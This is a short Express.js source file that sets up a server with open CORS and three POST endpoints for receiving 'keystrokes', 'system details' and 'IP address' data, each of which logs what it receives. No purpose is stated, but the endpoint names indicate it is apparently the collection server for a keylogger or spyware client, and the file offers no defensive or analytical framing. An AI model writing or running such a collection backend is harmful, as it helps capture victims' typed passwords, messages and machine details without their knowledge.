import express, { json } from 'express';
import cors from 'cors'; 
const app = express();
const port = 3000;

app.use(json());
app.use(cors());  

app.post('/keystrokes', (req, res) => {
    console.log('Keystrokes received:', req.body);
    res.status(200).send('Keystrokes received');
});

app.post('/systemdetails', (req, res) => {
    console.log('System details received:', req.body);
    res.status(200).send('System details received');
});

app.post('/ipaddress', (req, res) => {
    console.log('IP address received:', req.body);
    res.status(200).send('IP address received');
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
